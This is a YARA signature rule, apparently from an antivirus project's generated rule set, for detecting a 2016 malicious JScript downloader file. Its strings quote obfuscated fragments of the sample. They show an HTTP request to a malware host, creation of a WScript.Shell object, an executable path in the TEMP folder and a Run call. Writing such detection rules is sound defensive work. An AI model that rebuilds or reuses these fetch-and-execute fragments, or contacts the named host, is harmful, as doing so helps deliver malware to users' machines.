rule sig_20160330_c74095abcd060eb4acc4f377368342cf {
  meta:
    description = "datamaliciousorder - file 20160330_c74095abcd060eb4acc4f377368342cf.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f6e620bd73830dcfcbbc27b79a51f5118567d8c50dba270e9f30f44a9dedd718"

  strings:
    $s1  = "_G1[_VF](\"GET\", \"http://sterdicustom.com/w3iks\", false);" fullword ascii
    $s2  = "var _UV = function _FW() {return WScript[_X](\"WScript\"+\".Shell\");}(), _L1 = 11;" fullword ascii
    $s3  = "function _G(_LX, _J0){_W = _W * 1; return _LX - _J0;};" fullword ascii
    $s4  = "if (_G1[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _CB() {return _UV[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"0dotgsnmxyiTMro.ex\" + \"e\";};" fullword ascii
    $s6  = "function _KE(){return _N + \"\";};" fullword ascii
    $s7  = "function _AO() {return ((_X0 == true) && (_X0 == _ID)) ? 1 : _W;};" fullword ascii
    $s8  = "function _WE(_LO){_UV[\"Run\"](_LO, _W, _W);};" fullword ascii
    $s9  = "function _QZ(){return _X;};" fullword ascii
    $s10 = "function _PU()" fullword ascii
    $s11 = " while (_BE){" fullword ascii
    $s12 = "return _G(_VH, _DA);" fullword ascii
    $s13 = "function _OI(){return 22;};" fullword ascii
    $s14 = "function _WY(_G0) {var _U = (1, 2, 3, 4, 5, _G0); return _U;};" fullword ascii
    $s15 = "var _AA = new this[\"Date\"]();" fullword ascii
    $s16 = "var _ID = false;" fullword ascii
    $s17 = "_ID = true; " fullword ascii
    $s18 = "var _X0 = false;" fullword ascii
    $s19 = "_X0 = true; " fullword ascii
    $s20 = "var _C = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}